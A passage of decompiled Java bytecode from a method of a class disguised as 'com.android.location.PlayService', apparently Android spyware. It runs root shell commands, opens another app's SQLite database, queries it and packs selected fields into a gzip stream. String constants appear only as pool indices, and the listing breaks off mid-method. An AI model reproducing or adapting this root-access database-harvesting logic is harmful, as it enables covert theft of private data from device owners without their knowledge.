    //   376: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   379: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   382: astore 20
    //   384: aload 14
    //   386: astore 12
    //   388: aload 13
    //   390: astore 9
    //   392: aload 16
    //   394: astore 7
    //   396: aload 15
    //   398: astore 8
    //   400: aload 17
    //   402: astore 6
    //   404: aload 20
    //   406: invokevirtual 1257	java/io/File:exists	()Z
    //   409: ifeq +61 -> 470
    //   412: aload 14
    //   414: astore 12
    //   416: aload 13
    //   418: astore 9
    //   420: aload 16
    //   422: astore 7
    //   424: aload 15
    //   426: astore 8
    //   428: aload 17
    //   430: astore 6
    //   432: aload 20
    //   434: invokevirtual 1265	java/io/File:canRead	()Z
    //   437: ifeq +33 -> 470
    //   440: aload 14
    //   442: astore 12
    //   444: aload 13
    //   446: astore 9
    //   448: aload 16
    //   450: astore 7
    //   452: aload 15
    //   454: astore 8
    //   456: aload 17
    //   458: astore 6
    //   460: aload 20
    //   462: invokevirtual 1277	java/io/File:length	()J
    //   465: lconst_0
    //   466: lcmp
    //   467: ifne +79 -> 546
    //   470: aload 14
    //   472: astore 12
    //   474: aload 13
    //   476: astore 9
    //   478: aload 16
    //   480: astore 7
    //   482: aload 15
    //   484: astore 8
    //   486: aload 17
    //   488: astore 6
    //   490: new 864	java/lang/StringBuilder
    //   493: dup
    //   494: ldc_w 5468
    //   497: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   500: getstatic 880	com/android/location/PlayService:dataPath	Ljava/lang/String;
    //   503: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   506: ldc_w 5462
    //   509: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   512: ldc_w 5464
    //   515: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   518: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   521: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   524: aload 11
    //   526: ifnull +8 -> 534
    //   529: aload 11
    //   531: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   534: aload 10
    //   536: ifnull +8 -> 544
    //   539: aload 10
    //   541: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   544: lconst_0
    //   545: lreturn
    //   546: aload 14
    //   548: astore 12
    //   550: aload 13
    //   552: astore 9
    //   554: aload 16
    //   556: astore 7
    //   558: aload 15
    //   560: astore 8
    //   562: aload 17
    //   564: astore 6
    //   566: ldc_w 5470
    //   569: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   572: aload 14
    //   574: astore 12
    //   576: aload 13
    //   578: astore 9
    //   580: aload 16
    //   582: astore 7
    //   584: aload 15
    //   586: astore 8
    //   588: aload 17
    //   590: astore 6
    //   592: aload_0
    //   593: ldc_w 5464
    //   596: invokevirtual 1998	com/android/location/PlayService:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   599: astore 10
    //   601: aload 14
    //   603: astore 12
    //   605: aload 13
    //   607: astore 9
    //   609: aload 10
    //   611: astore 7
    //   613: aload 15
    //   615: astore 8
    //   617: aload 10
    //   619: astore 6
    //   621: aload_0
    //   622: ldc_w 5472
    //   625: iconst_0
    //   626: invokevirtual 2001	com/android/location/PlayService:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   629: astore 11
    //   631: aload 14
    //   633: astore 12
    //   635: aload 11
    //   637: astore 9
    //   639: aload 10
    //   641: astore 7
    //   643: aload 11
    //   645: astore 8
    //   647: aload 10
    //   649: astore 6
    //   651: new 864	java/lang/StringBuilder
    //   654: dup
    //   655: ldc_w 2003
    //   658: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   661: aload 10
    //   663: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   666: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   669: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   672: aload 14
    //   674: astore 12
    //   676: aload 11
    //   678: astore 9
    //   680: aload 10
    //   682: astore 7
    //   684: aload 11
    //   686: astore 8
    //   688: aload 10
    //   690: astore 6
    //   692: new 864	java/lang/StringBuilder
    //   695: dup
    //   696: ldc_w 2005
    //   699: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   702: aload 11
    //   704: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   707: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   710: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   713: aload 10
    //   715: ifnull +946 -> 1661
    //   718: aload 11
    //   720: ifnull +941 -> 1661
    //   723: aload 14
    //   725: astore 12
    //   727: aload 11
    //   729: astore 9
    //   731: aload 10
    //   733: astore 7
    //   735: aload 11
    //   737: astore 8
    //   739: aload 10
    //   741: astore 6
    //   743: new 2007	java/io/BufferedReader
    //   746: dup
    //   747: new 2009	java/io/InputStreamReader
    //   750: dup
    //   751: aload 10
    //   753: invokespecial 2012	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   756: invokespecial 2015	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   759: astore 16
    //   761: aload 14
    //   763: astore 12
    //   765: aload 11
    //   767: astore 9
    //   769: aload 10
    //   771: astore 7
    //   773: aload 11
    //   775: astore 8
    //   777: aload 10
    //   779: astore 6
    //   781: aload 16
    //   783: invokevirtual 2018	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   786: astore 15
    //   788: aload 15
    //   790: ifnonnull +357 -> 1147
    //   793: aload 14
    //   795: astore 12
    //   797: aload 11
    //   799: astore 9
    //   801: aload 10
    //   803: astore 7
    //   805: aload 11
    //   807: astore 8
    //   809: aload 10
    //   811: astore 6
    //   813: new 864	java/lang/StringBuilder
    //   816: dup
    //   817: aload 19
    //   819: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   822: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   825: ldc_w 1712
    //   828: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   831: aload 18
    //   833: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   836: ldc_w 5474
    //   839: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   842: getstatic 880	com/android/location/PlayService:dataPath	Ljava/lang/String;
    //   845: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   848: ldc_w 5462
    //   851: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   854: ldc_w 5472
    //   857: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   860: ldc_w 5476
    //   863: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   866: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   869: astore 13
    //   871: aload 14
    //   873: astore 12
    //   875: aload 11
    //   877: astore 9
    //   879: aload 10
    //   881: astore 7
    //   883: aload 11
    //   885: astore 8
    //   887: aload 10
    //   889: astore 6
    //   891: new 864	java/lang/StringBuilder
    //   894: dup
    //   895: ldc_w 4334
    //   898: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   901: aload 18
    //   903: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   906: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   909: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   912: pop
    //   913: aload 14
    //   915: astore 12
    //   917: aload 11
    //   919: astore 9
    //   921: aload 10
    //   923: astore 7
    //   925: aload 11
    //   927: astore 8
    //   929: aload 10
    //   931: astore 6
    //   933: aload 13
    //   935: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   938: pop
    //   939: aload 14
    //   941: astore 12
    //   943: aload 11
    //   945: astore 9
    //   947: aload 10
    //   949: astore 7
    //   951: aload 11
    //   953: astore 8
    //   955: aload 10
    //   957: astore 6
    //   959: new 864	java/lang/StringBuilder
    //   962: dup
    //   963: ldc_w 1986
    //   966: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   969: aload 18
    //   971: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   974: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   977: invokestatic 1225	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
    //   980: pop
    //   981: aload 14
    //   983: astore 12
    //   985: aload 11
    //   987: astore 9
    //   989: aload 10
    //   991: astore 7
    //   993: aload 11
    //   995: astore 8
    //   997: aload 10
    //   999: astore 6
    //   1001: new 1250	java/io/File
    //   1004: dup
    //   1005: aload 18
    //   1007: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   1010: astore 13
    //   1012: aload 14
    //   1014: astore 12
    //   1016: aload 11
    //   1018: astore 9
    //   1020: aload 10
    //   1022: astore 7
    //   1024: aload 11
    //   1026: astore 8
    //   1028: aload 10
    //   1030: astore 6
    //   1032: aload 13
    //   1034: invokevirtual 1257	java/io/File:exists	()Z
    //   1037: ifeq +61 -> 1098
    //   1040: aload 14
    //   1042: astore 12
    //   1044: aload 11
    //   1046: astore 9
    //   1048: aload 10
    //   1050: astore 7
    //   1052: aload 11
    //   1054: astore 8
    //   1056: aload 10
    //   1058: astore 6
    //   1060: aload 13
    //   1062: invokevirtual 1265	java/io/File:canRead	()Z
    //   1065: ifeq +33 -> 1098
    //   1068: aload 14
    //   1070: astore 12
    //   1072: aload 11
    //   1074: astore 9
    //   1076: aload 10
    //   1078: astore 7
    //   1080: aload 11
    //   1082: astore 8
    //   1084: aload 10
    //   1086: astore 6
    //   1088: aload 13
    //   1090: invokevirtual 1277	java/io/File:length	()J
    //   1093: lconst_0
    //   1094: lcmp
    //   1095: ifne +595 -> 1690
    //   1098: aload 14
    //   1100: astore 12
    //   1102: aload 11
    //   1104: astore 9
    //   1106: aload 10
    //   1108: astore 7
    //   1110: aload 11
    //   1112: astore 8
    //   1114: aload 10
    //   1116: astore 6
    //   1118: ldc_w 5478
    //   1121: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1124: aload 11
    //   1126: ifnull +8 -> 1134
    //   1129: aload 11
    //   1131: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   1134: aload 10
    //   1136: ifnull +8 -> 1144
    //   1139: aload 10
    //   1141: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   1144: iload_3
    //   1145: i2l
    //   1146: lreturn
    //   1147: aload 15
    //   1149: astore 13
    //   1151: aload 14
    //   1153: astore 12
    //   1155: aload 11
    //   1157: astore 9
    //   1159: aload 10
    //   1161: astore 7
    //   1163: aload 11
    //   1165: astore 8
    //   1167: aload 10
    //   1169: astore 6
    //   1171: aload 15
    //   1173: ldc_w 5480
    //   1176: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   1179: ifeq +263 -> 1442
    //   1182: aload 15
    //   1184: astore 13
    //   1186: aload 14
    //   1188: astore 12
    //   1190: aload 11
    //   1192: astore 9
    //   1194: aload 10
    //   1196: astore 7
    //   1198: aload 11
    //   1200: astore 8
    //   1202: aload 10
    //   1204: astore 6
    //   1206: aload 15
    //   1208: ldc_w 5482
    //   1211: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   1214: ifle +228 -> 1442
    //   1217: aload 14
    //   1219: astore 12
    //   1221: aload 11
    //   1223: astore 9
    //   1225: aload 10
    //   1227: astore 7
    //   1229: aload 11
    //   1231: astore 8
    //   1233: aload 10
    //   1235: astore 6
    //   1237: ldc_w 5484
    //   1240: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1243: aload 14
    //   1245: astore 12
    //   1247: aload 11
    //   1249: astore 9
    //   1251: aload 10
    //   1253: astore 7
    //   1255: aload 11
    //   1257: astore 8
    //   1259: aload 10
    //   1261: astore 6
    //   1263: aload 15
    //   1265: ldc_w 5482
    //   1268: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   1271: astore 13
    //   1273: aload 13
    //   1275: ifnull +353 -> 1628
    //   1278: aload 14
    //   1280: astore 12
    //   1282: aload 11
    //   1284: astore 9
    //   1286: aload 10
    //   1288: astore 7
    //   1290: aload 11
    //   1292: astore 8
    //   1294: aload 10
    //   1296: astore 6
    //   1298: new 864	java/lang/StringBuilder
    //   1301: dup
    //   1302: ldc_w 5486
    //   1305: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1308: aload 13
    //   1310: arraylength
    //   1311: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1314: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1317: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1320: aload 14
    //   1322: astore 12
    //   1324: aload 11
    //   1326: astore 9
    //   1328: aload 10
    //   1330: astore 7
    //   1332: aload 11
    //   1334: astore 8
    //   1336: aload 10
    //   1338: astore 6
    //   1340: aload 13
    //   1342: arraylength
    //   1343: ifle +229 -> 1572
    //   1346: aload 14
    //   1348: astore 12
    //   1350: aload 11
    //   1352: astore 9
    //   1354: aload 10
    //   1356: astore 7
    //   1358: aload 11
    //   1360: astore 8
    //   1362: aload 10
    //   1364: astore 6
    //   1366: new 864	java/lang/StringBuilder
    //   1369: dup
    //   1370: aload 13
    //   1372: iconst_0
    //   1373: aaload
    //   1374: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   1377: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1380: ldc_w 5417
    //   1383: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1386: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1389: astore 13
    //   1391: aload 14
    //   1393: astore 12
    //   1395: aload 11
    //   1397: astore 9
    //   1399: aload 10
    //   1401: astore 7
    //   1403: aload 11
    //   1405: astore 8
    //   1407: aload 10
    //   1409: astore 6
    //   1411: ldc_w 5488
    //   1414: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1417: aload 14
    //   1419: astore 12
    //   1421: aload 11
    //   1423: astore 9
    //   1425: aload 10
    //   1427: astore 7
    //   1429: aload 11
    //   1431: astore 8
    //   1433: aload 10
    //   1435: astore 6
    //   1437: aload 13
    //   1439: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1442: aload 14
    //   1444: astore 12
    //   1446: aload 11
    //   1448: astore 9
    //   1450: aload 10
    //   1452: astore 7
    //   1454: aload 11
    //   1456: astore 8
    //   1458: aload 10
    //   1460: astore 6
    //   1462: aload 11
    //   1464: new 864	java/lang/StringBuilder
    //   1467: dup
    //   1468: aload 13
    //   1470: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   1473: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1476: ldc_w 1312
    //   1479: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1482: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1485: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   1488: invokevirtual 1657	java/io/FileOutputStream:write	([B)V
    //   1491: goto -730 -> 761
    //   1494: astore_1
    //   1495: aload 9
    //   1497: astore 8
    //   1499: aload 7
    //   1501: astore 6
    //   1503: aload_1
    //   1504: ldc_w 5490
    //   1507: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   1510: aload 12
    //   1512: ifnull +36 -> 1548
    //   1515: aload 9
    //   1517: astore 8
    //   1519: aload 7
    //   1521: astore 6
    //   1523: aload 12
    //   1525: invokeinterface 4421 1 0
    //   1530: ifne +18 -> 1548
    //   1533: aload 9
    //   1535: astore 8
    //   1537: aload 7
    //   1539: astore 6
    //   1541: aload 12
    //   1543: invokeinterface 1915 1 0
    //   1548: aload 9
    //   1550: ifnull +8 -> 1558
    //   1553: aload 9
    //   1555: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   1558: aload 7
    //   1560: ifnull +8 -> 1568
    //   1563: aload 7
    //   1565: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   1568: ldc2_w 3618
    //   1571: lreturn
    //   1572: aload 14
    //   1574: astore 12
    //   1576: aload 11
    //   1578: astore 9
    //   1580: aload 10
    //   1582: astore 7
    //   1584: aload 11
    //   1586: astore 8
    //   1588: aload 10
    //   1590: astore 6
    //   1592: ldc_w 5492
    //   1595: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1598: aload 15
    //   1600: astore 13
    //   1602: goto -160 -> 1442
    //   1605: astore_1
    //   1606: aload 8
    //   1608: ifnull +8 -> 1616
    //   1611: aload 8
    //   1613: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   1616: aload 6
    //   1618: ifnull +8 -> 1626
    //   1621: aload 6
    //   1623: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   1626: aload_1
    //   1627: athrow
    //   1628: aload 14
    //   1630: astore 12
    //   1632: aload 11
    //   1634: astore 9
    //   1636: aload 10
    //   1638: astore 7
    //   1640: aload 11
    //   1642: astore 8
    //   1644: aload 10
    //   1646: astore 6
    //   1648: ldc_w 5494
    //   1651: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1654: aload 15
    //   1656: astore 13
    //   1658: goto -216 -> 1442
    //   1661: aload 14
    //   1663: astore 12
    //   1665: aload 11
    //   1667: astore 9
    //   1669: aload 10
    //   1671: astore 7
    //   1673: aload 11
    //   1675: astore 8
    //   1677: aload 10
    //   1679: astore 6
    //   1681: ldc_w 2041
    //   1684: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1687: goto -1163 -> 524
    //   1690: aload 14
    //   1692: astore 12
    //   1694: aload 11
    //   1696: astore 9
    //   1698: aload 10
    //   1700: astore 7
    //   1702: aload 11
    //   1704: astore 8
    //   1706: aload 10
    //   1708: astore 6
    //   1710: new 864	java/lang/StringBuilder
    //   1713: dup
    //   1714: ldc_w 5496
    //   1717: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1720: aload 13
    //   1722: invokevirtual 1277	java/io/File:length	()J
    //   1725: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   1728: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1731: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1734: aload 14
    //   1736: astore 12
    //   1738: aload 11
    //   1740: astore 9
    //   1742: aload 10
    //   1744: astore 7
    //   1746: aload 11
    //   1748: astore 8
    //   1750: aload 10
    //   1752: astore 6
    //   1754: aload 18
    //   1756: aconst_null
    //   1757: iconst_1
    //   1758: invokestatic 4382	android/database/sqlite/SQLiteDatabase:openDatabase	(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;
    //   1761: astore 15
    //   1763: aload 14
    //   1765: astore 12
    //   1767: aload 11
    //   1769: astore 9
    //   1771: aload 10
    //   1773: astore 7
    //   1775: aload 11
    //   1777: astore 8
    //   1779: aload 10
    //   1781: astore 6
    //   1783: new 864	java/lang/StringBuilder
    //   1786: dup
    //   1787: ldc_w 4384
    //   1790: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1793: aload 15
    //   1795: invokevirtual 4387	android/database/sqlite/SQLiteDatabase:isOpen	()Z
    //   1798: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   1801: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1804: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1807: aload 14
    //   1809: astore 12
    //   1811: aload 11
    //   1813: astore 9
    //   1815: aload 10
    //   1817: astore 7
    //   1819: aload 11
    //   1821: astore 8
    //   1823: aload 10
    //   1825: astore 6
    //   1827: aload 15
    //   1829: invokevirtual 4387	android/database/sqlite/SQLiteDatabase:isOpen	()Z
    //   1832: ifeq -708 -> 1124
    //   1835: aload 14
    //   1837: astore 12
    //   1839: aload 11
    //   1841: astore 9
    //   1843: aload 10
    //   1845: astore 7
    //   1847: aload 11
    //   1849: astore 8
    //   1851: aload 10
    //   1853: astore 6
    //   1855: new 864	java/lang/StringBuilder
    //   1858: dup
    //   1859: ldc_w 5498
    //   1862: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1865: getstatic 605	com/android/location/PlayService:lTGCounter	J
    //   1868: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   1871: ldc_w 5500
    //   1874: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1877: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1880: astore 13
    //   1882: aload 14
    //   1884: astore 12
    //   1886: aload 11
    //   1888: astore 9
    //   1890: aload 10
    //   1892: astore 7
    //   1894: aload 11
    //   1896: astore 8
    //   1898: aload 10
    //   1900: astore 6
    //   1902: aload 13
    //   1904: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1907: aload 14
    //   1909: astore 12
    //   1911: aload 11
    //   1913: astore 9
    //   1915: aload 10
    //   1917: astore 7
    //   1919: aload 11
    //   1921: astore 8
    //   1923: aload 10
    //   1925: astore 6
    //   1927: aload 15
    //   1929: aload 13
    //   1931: aconst_null
    //   1932: invokevirtual 4395	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   1935: astore 14
    //   1937: iconst_1
    //   1938: istore_3
    //   1939: aload 14
    //   1941: ifnull +1027 -> 2968
    //   1944: aload 14
    //   1946: astore 12
    //   1948: aload 11
    //   1950: astore 9
    //   1952: aload 10
    //   1954: astore 7
    //   1956: aload 11
    //   1958: astore 8
    //   1960: aload 10
    //   1962: astore 6
    //   1964: new 864	java/lang/StringBuilder
    //   1967: dup
    //   1968: ldc_w 5502
    //   1971: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1974: aload 14
    //   1976: invokeinterface 2159 1 0
    //   1981: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1984: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1987: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1990: aload 14
    //   1992: astore 12
    //   1994: aload 11
    //   1996: astore 9
    //   1998: aload 10
    //   2000: astore 7
    //   2002: aload 11
    //   2004: astore 8
    //   2006: aload 10
    //   2008: astore 6
    //   2010: aload 14
    //   2012: invokeinterface 1903 1 0
    //   2017: ifeq +683 -> 2700
    //   2020: aload 14
    //   2022: astore 12
    //   2024: aload 11
    //   2026: astore 9
    //   2028: aload 10
    //   2030: astore 7
    //   2032: aload 11
    //   2034: astore 8
    //   2036: aload 10
    //   2038: astore 6
    //   2040: ldc_w 5504
    //   2043: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2046: aload 14
    //   2048: astore 12
    //   2050: aload 11
    //   2052: astore 9
    //   2054: aload 10
    //   2056: astore 7
    //   2058: aload 11
    //   2060: astore 8
    //   2062: aload 10
    //   2064: astore 6
    //   2066: aload_1
    //   2067: bipush 97
    //   2069: invokevirtual 2292	java/util/zip/GZIPOutputStream:write	(I)V
    //   2072: iload 4
    //   2074: istore_2
    //   2075: aload 14
    //   2077: astore 12
    //   2079: aload 11
    //   2081: astore 9
    //   2083: aload 10
    //   2085: astore 7
    //   2087: aload 11
    //   2089: astore 8
    //   2091: aload 10
    //   2093: astore 6
    //   2095: aload 14
    //   2097: aload 14
    //   2099: ldc_w 5506
    //   2102: invokeinterface 1908 2 0
    //   2107: invokeinterface 2165 2 0
    //   2112: istore 5
    //   2114: aload 14
    //   2116: astore 12
    //   2118: aload 11
    //   2120: astore 9
    //   2122: aload 10
    //   2124: astore 7
    //   2126: aload 11
    //   2128: astore 8
    //   2130: aload 10
    //   2132: astore 6
    //   2134: aload_0
    //   2135: aload_1
    //   2136: iload 5
    //   2138: invokestatic 4401	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   2141: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2144: aload 14
    //   2146: astore 12
    //   2148: aload 11
    //   2150: astore 9
    //   2152: aload 10
    //   2154: astore 7
    //   2156: aload 11
    //   2158: astore 8
    //   2160: aload 10
    //   2162: astore 6
    //   2164: aload_0
    //   2165: aload_1
    //   2166: bipush 9
    //   2168: invokestatic 4401	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   2171: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2174: aload 14
    //   2176: astore 12
    //   2178: aload 11
    //   2180: astore 9
    //   2182: aload 10
    //   2184: astore 7
    //   2186: aload 11
    //   2188: astore 8
    //   2190: aload 10
    //   2192: astore 6
    //   2194: aload_0
    //   2195: aload_1
    //   2196: ldc_w 571
    //   2199: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2202: aload 14
    //   2204: astore 12
    //   2206: aload 11
    //   2208: astore 9
    //   2210: aload 10
    //   2212: astore 7
    //   2214: aload 11
    //   2216: astore 8
    //   2218: aload 10
    //   2220: astore 6
    //   2222: aload 14
    //   2224: aload 14
    //   2226: ldc_w 3435
    //   2229: invokeinterface 1908 2 0
    //   2234: invokeinterface 1909 2 0
    //   2239: astore 13
    //   2241: aload 13
    //   2243: ifnull +614 -> 2857
    //   2246: aload 14
    //   2248: astore 12
    //   2250: aload 11
    //   2252: astore 9
    //   2254: aload 10
    //   2256: astore 7
    //   2258: aload 11
    //   2260: astore 8
    //   2262: aload 10
    //   2264: astore 6
    //   2266: aload 13
    //   2268: ldc_w 5417
    //   2271: invokevirtual 1534	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   2274: astore 16
    //   2276: aload 14
    //   2278: astore 12
    //   2280: aload 11
    //   2282: astore 9
    //   2284: aload 10
    //   2286: astore 7
    //   2288: aload 11
    //   2290: astore 8
    //   2292: aload 10
    //   2294: astore 6
    //   2296: aload 16
    //   2298: arraylength
    //   2299: ifle +9 -> 2308
    //   2302: aload 16
    //   2304: iconst_0
    //   2305: aaload
    //   2306: astore 13
    //   2308: aload 14
    //   2310: astore 12
    //   2312: aload 11
    //   2314: astore 9
    //   2316: aload 10
    //   2318: astore 7
    //   2320: aload 11
    //   2322: astore 8
    //   2324: aload 10
    //   2326: astore 6
    //   2328: aload_0
    //   2329: aload_1
    //   2330: aload 13
    //   2332: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2335: aload 14
    //   2337: astore 12
    //   2339: aload 11
    //   2341: astore 9
    //   2343: aload 10
    //   2345: astore 7
    //   2347: aload 11
    //   2349: astore 8
    //   2351: aload 10
    //   2353: astore 6
    //   2355: aload_0
    //   2356: aload_1
    //   2357: aload 14
    //   2359: aload 14
    //   2361: ldc_w 3439
    //   2364: invokeinterface 1908 2 0
    //   2369: invokeinterface 2192 2 0
    //   2374: invokestatic 4407	java/lang/Long:toString	(J)Ljava/lang/String;
    //   2377: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2380: aload 14
    //   2382: astore 12
    //   2384: aload 11
    //   2386: astore 9
    //   2388: aload 10
    //   2390: astore 7
    //   2392: aload 11
    //   2394: astore 8
    //   2396: aload 10
    //   2398: astore 6
    //   2400: aload_0
    //   2401: aload_1
    //   2402: aload 14
    //   2404: aload 14
    //   2406: ldc_w 5508
    //   2409: invokeinterface 1908 2 0
    //   2414: invokeinterface 1909 2 0
    //   2419: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2422: aload 14
    //   2424: astore 12
    //   2426: aload 11
    //   2428: astore 9
    //   2430: aload 10
    //   2432: astore 7
    //   2434: aload 11
    //   2436: astore 8
    //   2438: aload 10
    //   2440: astore 6
    //   2442: aload 14
    //   2444: aload 14
    //   2446: ldc_w 2300
    //   2449: invokeinterface 1908 2 0
    //   2454: invokeinterface 4414 2 0
    //   2459: astore 13
    //   2461: aload 13
    //   2463: ifnull +29 -> 2492
